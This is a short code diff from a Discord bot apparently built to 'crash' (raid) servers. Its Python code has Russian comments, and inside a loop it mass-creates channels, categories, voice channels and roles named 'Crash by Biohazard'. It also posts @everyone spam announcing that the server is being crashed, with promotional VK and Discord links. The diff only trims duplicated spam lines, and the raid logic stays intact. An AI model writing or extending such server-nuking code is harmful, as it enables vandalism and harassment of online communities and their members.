@@ -180,11 +180,7 @@ class MyClient(discord.Client):
 						y = await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
 						await y.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8')
 						await message.guild.create_category('Crash by Biohazard') #создание категории
-						y = await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
-						await y.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8')
 						await message.guild.create_voice_channel(name='Crash by Biohazard') #создание голосового канала
-						y = await message.guild.create_text_channel('crash-by-biohazard') #создание текстового канала
-						await y.send('@everyone Внимание, сервер крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/X5R4Za8')
 						await message.guild.create_role(name='Crash by Biohazard', colour=discord.Colour(0x00cc00)) #создание роли
 				except:
 					pass
